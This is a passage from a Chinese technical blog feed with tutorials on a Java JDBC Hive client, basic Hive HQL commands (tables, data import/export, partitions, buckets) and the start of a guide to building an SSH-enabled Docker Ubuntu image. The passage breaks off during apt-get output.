class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Hive</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载驱动、创建连接</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(driverName);</span><br><span class="line">        conn = DriverManager.getConnection(url,user,password);</span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">destory</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">            rs.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stmt != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stmt.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//建立连接</span></span><br><span class="line">        init();</span><br><span class="line">        <span class="comment">//表名称</span></span><br><span class="line">        String Tablename = <span class="string">"Test"</span>;</span><br><span class="line">        <span class="comment">//文件路径</span></span><br><span class="line"></span><br><span class="line">        String localFilePath = <span class="string">"E:\\Data.txt"</span>;</span><br><span class="line">        String hdfsFilePath = <span class="string">"/Test"</span> +today.substring(<span class="number">0</span>,<span class="number">7</span>) + <span class="string">"/upload_date="</span> + today + <span class="string">"/"</span>;</span><br><span class="line">        File localfilepath = <span class="keyword">new</span> File(localFilePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 1.查看hdfs中所有目录</span></span><br><span class="line"><span class="comment">         * 2.创建文件夹</span></span><br><span class="line"><span class="comment">         * 3.将本地文件上传到hdfs中</span></span><br><span class="line"><span class="comment">         * 4.将hdfs的文件上传到hive表中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="comment">//        HdfsTest.getDiretoryFromHdfs("/");</span></span><br><span class="line"><span class="comment">//        HdfsTest.mkdir(hdfsFilePath);</span></span><br><span class="line"><span class="comment">//        HdfsTest.uploadFile(localFilePath,hdfsFilePath);</span></span><br><span class="line"><span class="comment">//        HdfsTest.getDiretoryFromHdfs(hdfsFilePath);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        createTable(Tablename);</span></span><br><span class="line"><span class="comment">//        showTables();</span></span><br><span class="line"><span class="comment">//    loadData(hdfsFilePath+localfilepath.getName(),Tablename);</span></span><br><span class="line">        descTable(Tablename);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    selectData();</span></span><br><span class="line"><span class="comment">//    countData();</span></span><br><span class="line"><span class="comment">//    dropTable();</span></span><br><span class="line">        destory();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建表</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createTable</span><span class="params">(String Tablename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        stmt.execute(<span class="string">"drop table if exists "</span> + Tablename );</span><br><span class="line">        String sql = <span class="string">"create table "</span> + Tablename + <span class="string">" (id int, name string)"</span>;</span><br><span class="line">        stmt.execute(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询所有表</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showTables</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sql = <span class="string">"show tables"</span>;</span><br><span class="line">        rs = stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看表结构</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">descTable</span><span class="params">(String Tablename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sql = <span class="string">"desc "</span>+Tablename+<span class="string">""</span>;</span><br><span class="line">        rs = stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="number">1</span>) + <span class="string">"\t"</span> + rs.getString(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadData</span><span class="params">(String filePath,String Tablename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String sql = <span class="string">"load data inpath '"</span> + filePath + <span class="string">"' into table "</span>+Tablename;</span><br><span class="line">        stmt.execute(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectData</span><span class="params">(String Tablename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sql = <span class="string">"select * from "</span>+Tablename+<span class="string">""</span>;</span><br><span class="line">        rs = stmt.executeQuery(sql);</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">"foo"</span>) + <span class="string">"\t\t"</span> + rs.getString(<span class="string">"bar"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除数据库表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dropTable</span><span class="params">(String Tablename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String sql = <span class="string">"drop table if exists "</span>+ Tablename;</span><br><span class="line">        stmt.execute(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里跟HDFS接口有所依赖,可以参考我这篇文章<a href="https://plutoacharon.github.io/2019/08/31/HDFS%E6%96%87%E4%BB%B6%E6%8E%A5%E5%8F%A3/">HDFS接口</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;Hadoop2.8.0
Hbase-1.4.9
Centos7.2
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=
      
    
    </summary>
    
      <category term="Hive" scheme="https://plutoacharon.github.io/categories/Hive/"/>
    
    
      <category term="Hive" scheme="https://plutoacharon.github.io/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>Hive基本命令操作</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Hive%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Hive基本命令操作/</id>
    <published>2019-11-28T09:30:39.000Z</published>
    <updated>2019-11-28T09:31:14.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Hive定义了一套自己的SQL，简称HQL，它与关系型数据库的SQL略有不同，但支持了绝大多数的语句如DDL、DML以及常见的聚合函数、连接查询、条件查询。</p><p>DDL操作（数据定义语言）包括：Create、Alter、Show、Drop等。</p><p>（1）create database- 创建新数据库</p><p>（2）alter database - 修改数据库</p><p>（3）drop database - 删除数据库</p><p>（4）create table - 创建新表</p><p>（5）alter table - 变更（改变）数据库表</p><p>（6）drop table - 删除表</p><p>（7）create index - 创建索引（搜索键）</p><p>（8）drop index - 删除索引</p><p>（9）show table - 查看表</p><p>DML操作（数据操作语言）包括：Load 、Insert、Update、Delete、Merge。</p><h2 id="基本命令操作"><a href="#基本命令操作" class="headerlink" title="基本命令操作"></a>基本命令操作</h2><p>（1）load data - 加载数据</p><p>①insert into - 插入数据</p><p>②insert overwrite - 覆盖数据（insert … values从Hive 0.14开始可用。）</p><p>（2）update table - 更新表（update在Hive 0.14开始可用，并且只能在支持ACID的表上执行）</p><p>（3）delete from table where id = 1; - 删除表中ID等于1的数据（delete在Hive 0.14开始可用，并且只能在支持ACID的表上执行）</p><p>（4）merge - 合并（MERGE在Hive 2.2开始可用，并且只能在支持ACID的表上执行）</p><p>注意：频繁的update和delete操作已经违背了Hive的初衷。不到万不得已的情况，还是使用增量添加的方式最好。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol><li><p>启动hadoop集群</p></li><li><p>开启Hive，首先，需要保证Mysql启动</p></li></ol><h3 id="Hive数据仓库的操作"><a href="#Hive数据仓库的操作" class="headerlink" title="Hive数据仓库的操作"></a>Hive数据仓库的操作</h3><p>1.在Hive中创建一个数据仓库，名为DB。<br><code>create database DB;</code></p><p>2.以上简单创建了一个DB库，但是这条sql可以更进一步的优化，我们可以加上<code>if not exists</code>。<br><code>create database if not exists DB;</code></p><p>解析：在创建库时，应避免新建的库名与已有库名重复，如果库名重复将会报出以下错误（我在已有DB库的前提下，再次创建了DB库）。</p><p>错误提示数据仓库DB已经存在， 那么加入的if not exists就起了作用，如下（在已有DB库的前提下，再次创建DB库，提示成功不会报错）</p><p>加入<code>if not exists</code>的意思是如果没有DB库就创建，如果已有就不再创建。</p><p>3.查看数据仓库DB的信息及路径。</p><p><code>describe database DB;</code></p><p>4.删除名为DB的数据仓库。</p><p><code>drop database if exists DB;</code></p><h3 id="Hive数据表的操作"><a href="#Hive数据表的操作" class="headerlink" title="Hive数据表的操作"></a>Hive数据表的操作</h3><p>Hive的数据表分为两种：内部表和外部表。</p><p>Hive创建内部表时，会将数据移动到数据仓库指向的路径；若创建外部表，仅记录数据所在的路径， 不对数据的位置做任何改变。在删除表的时候，内部表的元数据和数据会被一起删除， 而外部表只删除元数据，不删除数据。这样外部表相对来说更加安全些，数据组织也更加灵活，方便共享源数据，生产中常使用外部表。</p><p>下面详细介绍对表操作的命令及使用方法：</p><p>即将创建的表，表名不能和已有表名重复，否则会报错，现在我们show tables一下，查看已存在的表。</p><p><code>show tables;</code></p><p>现在库中没有表。</p><p>1.创建一个名为cat的内部表，有两个字段为cat_id和cat_name，字符类型为string。</p><p><code>create table cat(cat_id string,cat_name string);</code></p><p>查看是否创建成功。</p><p><code>show tables;</code></p><p>下面我们再次创建一个与刚才表名相同的表，看一下报错。</p><p><code>create table cat(cat_id string,cat_name string);</code></p><p>提示错误，该表已经存在！说明表与库一样，名称不能重复，解决方法是加入if not exists。</p><p>2.创建一个外部表，表名为cat2，有两个字段为cat_id和cat_name，字符类型为string。</p><p><code>create external table if not exists cat2(cat_id string,cat_name string);</code></p><p>查看是否创建成功。</p><p><code>show tables;</code></p><p>外部表较内部表而言，只是在create后加了一个external。</p><p>3.修改cat表的表结构。对cat表添加两个字段group_id和cat_code。</p><p><code>alter table cat add columns(group_id string,cat_code string);</code></p><p>使用desc命令查看一下加完字段后的cat表结构 。<br><code>desc cat;</code></p><p>4.修改cat2表的表名。把cat2表重命名为cat3 。</p><p><code>alter table cat2 rename to cat3;</code></p><p>这个命令可以让用户为表更名，数据所在的位置和分区名并不改变。</p><p>5.删除名为cat3的表并查看。</p><p><code>drop table cat3;</code><br><code>show tables;</code></p><p>6.创建与已知表相同结构的表，创建一个与cat表结构相同的表，名为cat4，这里要用到like关键字。<br><code>create table cat4 like cat;</code></p><p>创建完成并查看结果。</p><p><code>show tables;</code></p><h3 id="Hive中数据的导入导出"><a href="#Hive中数据的导入导出" class="headerlink" title="Hive中数据的导入导出"></a>Hive中数据的导入导出</h3><p>以下介绍四种常见的数据导入方式：</p><p>1.从本地文件系统中导入数据到Hive表。</p><p>首先，在Hive中创建一个cat_group表，包含group_id和group_name两个字段，字符类型为string，以“\t”为分隔符，并查看结果。<br><code>create table cat_group(group_id string,group_name string) row format delimited fields terminated by &#39;\t&#39;  stored as textfile;</code><br><code>show tables;</code></p><pre><code>[row format delimited]关键字，是用来设置创建的表在加载数据的时候，支持的列分隔符。[stored as textfile]关键字，是用来设置加载数据的数据类型，默认是TEXTFILE，如果文件数据是纯文本，就是使用 [stored as textfile]，然后从本地直接拷贝到HDFS上，Hive直接可以识别数据。</code></pre><p>然后，将Linux本地/data/hive2目录下的cat_group文件导入到Hive中的cat_group表中。</p><p><code>load data local inpath &#39;/data/hive2/cat_group&#39; into table cat_group;</code><br>通过select语句查看cat_group表中是否成功导入数据，由于数据量大，使用limit关键字限制输出10条记录。</p><p><code>select * from cat_group limit 10;</code></p><p>导入成功。</p><p>2.将HDFS上的数据导入到Hive中。</p><p>首先，另外开启一个操作窗口，在HDFS上创建/myhive2目录。</p><p><code>hadoop fs -mkdir /myhive2</code></p><p>然后，将本地/data/hive2/下的cat_group表上传到HDFS的/myhive2上，并查看是否创建成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hadoop fs -put /data/hive2/cat_group /myhive2  </span><br><span class="line">hadoop fs -ls /myhive2</span><br></pre></td></tr></table></figure><p>接着，在Hive中创建名为cat_group1的表，创表语句如下。</p><p><code>create table cat_group1(group_id string,group_name string)  row format delimited fields terminated by &#39;\t&#39;  stored as textfile;</code></p><p>最后，将HDFS下/myhive2中的表cat_group导入到Hive中的cat_group1表中 ，并查看结果。</p><p><code>load data inpath &#39;/myhive2/cat_group&#39; into table cat_group1;</code><br><code>select * from cat_group1 limit 10;</code></p><p>导入成功。</p><p>提示：HDFS中数据导入到Hive中与本地数据导入到hive中的区别是load data后少了local。</p><p>3.从别的表中查询出相应的数据并导入到Hive中。</p><p>首先在Hive中创建一个名为cat_group2的表。</p><p><code>create table cat_group2(group_id string,group_name string)  row format delimited fields terminated by &#39;\t&#39;  stored as textfile;</code>  </p><p>用下面两种方式将cat_group1表中的数据导入到cat_group2表中。</p><p><code>insert into table cat_group2 select * from cat_group1;</code><br>或<br><code>insert overwrite table cat_group2 select * from cat_group1;</code></p><p>（insert overwrite 会覆盖数据）。</p><p>导入完成后，用select语句查询cat_group2表。<br><code>select * from cat_group2 limit 10;</code></p><p>4.在创建表的时候从别的表中查询出相应数据并插入到所创建的表中。</p><p>Hive中创建表cat_group3并直接从cat_group2中获得数据。<br><code>create table cat_group3 as select * from cat_group2;</code></p><p>创建并导入完成，用select语句查询实验结果。<br><code>select * from cat_group3 limit 10;</code></p><h3 id="三种常见的数据导出方式"><a href="#三种常见的数据导出方式" class="headerlink" title="三种常见的数据导出方式"></a>三种常见的数据导出方式</h3><p>1.导出到本地文件系统。</p><p>首先，在Linux本地新建/data/hive2/out目录。</p><p><code>mkdir -p /data/hive2/out</code></p><p>并将Hive中的cat_group表导出到本地文件系统/data/hive2/out中。</p><p>注意：方法和导入数据到Hive不一样，不能用insert into来将数据导出。</p><p><code>insert overwrite local directory &#39;/data/hive2/out&#39; select * from cat_group;</code></p><p>导出完成后，在Linux本地切换到/data/hive2/out目录，通过cat命令查询导出文件的内容。</p><p><code>cd /data/hive2/out</code><br><code>ls</code><br><code>cat 000000_0</code></p><p>通过上图可以看到导出的数据，字段之间没有分割开，所以我们使用下面的方式，将输出字段以“\t”键分割。</p><p><code>insert overwrite local directory &#39;/data/hive2/out&#39; select group_id,concat(&#39;\t&#39;,group_name) from cat_group;</code></p><p>通过cat命令查询/data/hive2/out目录下的导出文件。</p><p><code>cd /data/hive2/out/</code><br><code>cat 000000_0</code></p><p>2.Hive中数据导出到HDFS中</p><p>在HDFS上创建/myhive2/out目录。</p><p><code>hadoop fs -mkdir -p /myhive2/out</code></p><p>并将Hive中的表cat_group中的数据导入到HDFS的/myhive2/out目录里。</p><p><code>insert overwrite directory &#39;/myhive2/out&#39; select group_id,concat(&#39;\t&#39;,group_name) from cat_group;</code></p><p>导入完成后，在HDFS上的/myhive2/out目录下查看结果。</p><p><code>hadoop fs -ls /myhive2/out</code></p><p>3.导出到Hive的另一个表中。</p><p>将Hive中表cat_group中的数据导入到cat_group4中（两表字段及字符类型相同）。</p><p>首先在Hive中创建一个表cat_group4，有group_id和group_name两个字段，字符类型为string，以‘\t’为分隔符。</p><p><code>create table cat_group4(group_id string,group_name string)  row format delimited fields terminated by &#39;\t&#39;  stored as textfile;</code>  </p><p>然后将cat_group中的数据导入到cat_group4中。</p><p><code>insert into table cat_group4 select * from cat_group;</code></p><p>导入完成后，查看cat_group4表中数据。</p><p><code>select * from cat_group4 limit 10;</code></p><h3 id="Hive分区表的操作"><a href="#Hive分区表的操作" class="headerlink" title="Hive分区表的操作"></a>Hive分区表的操作</h3><p>Hive中创建分区表没有什么复杂的分区类型（范围分区、列表分区、hash 分区，混合分区等）。分区列也不是表中的一个实际的字段，而是一个或者多个伪列。意思是说，在表的数据文件中实际并不保存分区列的信息与数据。</p><p>1.创建表分区，在Hive中创建一个分区表goods，包含goods_id和goods_status两个字段，字符类型为string，分区为cat_id，字符类型为string，以“\t“为分隔符。</p><p><code>create table goods(goods_id string,goods_status string) partitioned by (cat_id string)  row format delimited fields terminated by &#39;\t&#39;;</code></p><p>查看表goods表结构。</p><p><code>desc goods;</code></p><p>这样一个分区表就建好了。</p><p>2.向分区表插入数据，将本地/data/hive2下的表goods中数据，插入到分区表goods中。</p><p>首先，在Hive中创建一个非分区表goods_1表，用于存储本地/data/hive2下的表goods中数据。</p><p><code>create table goods_1(goods_id string,goods_status string,cat_id string)  row format delimited fields terminated by &#39;\t&#39;;</code></p><p>将本地/data/hive2下的表goods中数据导入到Hive中的goods_1表中。</p><p><code>load data local inpath &#39;/data/hive2/goods&#39; into table goods_1;</code><br>再将表goods_1中的数据导入到分区表goods中。</p><p><code>insert into table goods partition(cat_id=&#39;52052&#39;) select goods_id,goods_status from goods_1 where cat_id=&#39;52052&#39;;</code></p><p>插入数据完成后，用select语句查看实验结果。</p><p><code>select * from goods limit 10;</code></p><p>4.查看表goods中的分区。</p><p><code>show partitions goods;</code></p><p>5.修改表分区，将分区表goods中的分区列cat_id=52052改为cat_id=52051,并查看修改后的分区名。</p><p><code>alter table goods partition(cat_id=52052) rename to partition(cat_id=52051);  show partitions goods;</code></p><p>6.删除表分区。</p><p>在删除goods分区表之前，先将goods表备份出一个goods_2表。</p><p><code>create table goods_2(goods_id string,goods_status string) partitioned by (cat_id string)  row format delimited fields terminated by &#39;\t&#39;;</code></p><p><code>insert into table goods_2 partition(cat_id=&#39;52052&#39;) select goods_id,goods_status from goods_1 where cat_id=&#39;52052&#39;;</code><br>删除goods表中的cat_id分区。</p><p><code>alter table goods drop if exists partition (cat_id=&#39;52051&#39;);</code></p><h3 id="Hive桶的操作"><a href="#Hive桶的操作" class="headerlink" title="Hive桶的操作"></a>Hive桶的操作</h3><p>1.桶的定义及用途</p><p>Hive还可以把表或分区，组织成桶。将表或分区组织成桶有以下几个目的：</p><p>（1）是为使取样更高效。在处理大规模的数据集时，在开发、测试阶段将所有的数据全部处理一遍可能不太现实，如果能在数据集的一小部分数据上试运行查询，会带来很多方便。</p><p>（2）是为了获得更好的查询处理效率。</p><p>桶为表提供了额外的结构，Hive在处理某些查询时利用这个结构，能够有效地提高查询效率。</p><p>具体而言，连接两个在（包含连接列的）相同列上划分了桶的表，可以使用Map端连接（Map-side join）高效的实现。比如JOIN操作。对于JOIN操作两个表有一个相同的列，如果对这两个表都进行了桶操作。那么将保存相同列值的桶进行JOIN操作就可以，可以大大较少JOIN的数据量。在建立桶之前，需要设置hive.enforce.bucketing属性为true，使得Hive能识别桶。</p><p>2.创建桶</p><p>创建一个名为goods_t的表，包含两个字段goods_id和goods_status，字符类型都为string，按cat_id string做分区，按goods_status列聚类和goods_id列排序，划分成两个桶</p><p><code>create table goods_t(goods_id string,goods_status string) partitioned by (cat_id string)  clustered by(goods_status) sorted by (goods_id) into 2 buckets;</code></p><p>设置环境变量<code>set hive.enforce.bucketing=ture</code></p><p><code>set hive.enforce.bucketing=true;</code></p><p>3.向goods_t表中插入goods_2表中的数据。</p><p><code>from goods_2 insert overwrite table goods_t partition(cat_id=&#39;52063&#39;) select goods_id,goods_status;</code></p><p>查看结果</p><p><code>select * from goods_t tablesample(bucket 1 out of 2 on goods_id);</code></p><p>tablesample 是抽样语句，语法如下:</p><p>tablesample(bucket x out of y)</p><p>y必须是table总bucket数的倍数或者因子。hive根据y的大小，决定抽样的比例。例如，table总共分了64份，当y=32时，抽取(64/32=)2个bucket的数据，当y=128时，抽取(64/128=)1/2个bucket的数据。</p><p>x表示从哪个bucket开始抽取。例如，table总bucket数为32，tablesample(bucket 3 out of 16)，表示总共抽取（32/16=）2个bucket的数据，分别为第3个bucket和第（3+16=）19个bucket的数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本介绍&quot;&gt;&lt;a href=&quot;#基本介绍&quot; class=&quot;headerlink&quot; title=&quot;基本介绍&quot;&gt;&lt;/a&gt;基本介绍&lt;/h2&gt;&lt;p&gt;Hive定义了一套自己的SQL，简称HQL，它与关系型数据库的SQL略有不同，但支持了绝大多数的语句如DDL、DML以及常见
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hive" scheme="https://plutoacharon.github.io/tags/Hive/"/>
    
  </entry>
  
  <entry>
    <title>Docker实战 创建支持SSH服务的镜像(超详细)</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Docker%E5%AE%9E%E6%88%98-%E5%88%9B%E5%BB%BA%E6%94%AF%E6%8C%81SSH%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%95%9C%E5%83%8F-%E8%B6%85%E8%AF%A6%E7%BB%86/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Docker实战-创建支持SSH服务的镜像-超详细/</id>
    <published>2019-11-28T09:29:49.000Z</published>
    <updated>2019-11-28T09:30:20.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于docker-commit命令创建"><a href="#基于docker-commit命令创建" class="headerlink" title="基于docker commit命令创建"></a>基于docker commit命令创建</h2><p>Docker提供了<code>docker commit</code>命令，支持用户提交自己对定制容器的修改，并生成新的镜像。</p><p>命令格式为：<code>docker commit CONTAINER [REPOSITORY[:TAG]]</code></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="利用ubuntu-14-04镜像创建一个容器："><a href="#利用ubuntu-14-04镜像创建一个容器：" class="headerlink" title="利用ubuntu:14.04镜像创建一个容器："></a>利用ubuntu:14.04镜像创建一个容器：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">docker.io/ubuntu        latest              b44d403a0d52        3 days ago          64.2 MB</span><br><span class="line">docker.io/nginx         latest              540a289bab6c        12 days ago         126 MB</span><br><span class="line">docker.io/hello-world   latest              fce289e99eb9        10 months ago       1.84 kB</span><br><span class="line">[root@node1 ~]<span class="comment"># </span></span><br><span class="line">[root@node1 ~]<span class="comment"># docker run -it docker.io/ubuntu /bin/bash</span></span><br><span class="line">root@b44d403a0d52:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="更新apt缓存"><a href="#更新apt缓存" class="headerlink" title="更新apt缓存:"></a>更新apt缓存:</h3><p>更换更新源:<br><code>vi /etc/apt/sources.list</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#aliyun</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>执行:<code>apt-get update</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">root@b44d403a0d52:/<span class="comment"># apt-get update</span></span><br><span class="line">Ign http://mirrors.aliyun.com trusty InRelease</span><br><span class="line">Get:1 http://mirrors.aliyun.com trusty-security InRelease [65.9 kB]</span><br><span class="line">Get:2 http://mirrors.aliyun.com trusty-updates InRelease [65.9 kB]</span><br><span class="line">Get:3 http://mirrors.aliyun.com trusty-proposed InRelease [65.9 kB]</span><br><span class="line">Get:4 http://mirrors.aliyun.com trusty-backports InRelease [65.9 kB]</span><br><span class="line">Get:5 http://mirrors.aliyun.com trusty Release.gpg [933 B]      </span><br><span class="line">Get:6 http://mirrors.aliyun.com trusty-security/main Sources [220 kB]</span><br><span class="line">Get:7 http://mirrors.aliyun.com trusty-security/restricted Sources [5050 B]</span><br><span class="line">Get:8 http://mirrors.aliyun.com trusty-security/universe Sources [126 kB]</span><br><span class="line">Get:9 http://mirrors.aliyun.com trusty-security/multiverse Sources [3070 B]</span><br><span class="line">Get:10 http://mirrors.aliyun.com trusty-security/main amd64 Packages [1032 kB]</span><br><span class="line">Get:11 http://mirrors.aliyun.com trusty-security/restricted amd64 Packages [18.1 kB]</span><br><span class="line">Get:12 http://mirrors.aliyun.com trusty-security/universe amd64 Packages [377 kB]</span><br><span class="line">Get:13 http://mirrors.aliyun.com trusty-security/multiverse amd64 Packages [4730 B]</span><br><span class="line">Get:14 http://mirrors.aliyun.com trusty-updates/main Sources [532 kB]</span><br><span class="line">Get:15 http://mirrors.aliyun.com trusty-updates/restricted Sources [6444 B]</span><br><span class="line">Get:16 http://mirrors.aliyun.com trusty-updates/universe Sources [288 kB]</span><br><span class="line">Get:17 http://mirrors.aliyun.com trusty-updates/multiverse Sources [7389 B]</span><br><span class="line">Get:18 http://mirrors.aliyun.com trusty-updates/main amd64 Packages [1460 kB]</span><br><span class="line">Get:19 http://mirrors.aliyun.com trusty-updates/restricted amd64 Packages [21.4 kB]</span><br><span class="line">Get:20 http://mirrors.aliyun.com 